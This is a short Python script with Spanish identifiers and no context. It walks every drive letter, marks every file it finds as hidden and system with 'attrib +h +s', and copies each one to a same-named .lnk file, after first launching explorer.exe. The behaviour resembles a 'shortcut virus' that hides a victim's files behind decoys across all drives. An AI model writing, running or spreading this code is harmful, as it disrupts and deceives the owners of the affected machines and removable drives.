import os, shutil, subprocess, string
c='start explorer.exe'
subprocess.run(c, shell=True)
letras=string.ascii_uppercase
for d in letras:
 letra=d + ':\\'
 if os.path.exists(letra):
 	for root, dirs, files in os.walk(letra):
 	 try:
 	 	for file in files:
 	 	 ruta_completa = os.path.join(root, file)
 	 	 lnk=(os.path.splitext(ruta_completa)[0]) + '.lnk'
 	 	 command='attrib +h +s "' + ruta_completa + '"'
 	 	 subprocess.run(command, shell=True)
 	 	 shutil.copy(ruta_completa, lnk)
 	 except:
 	 	continue
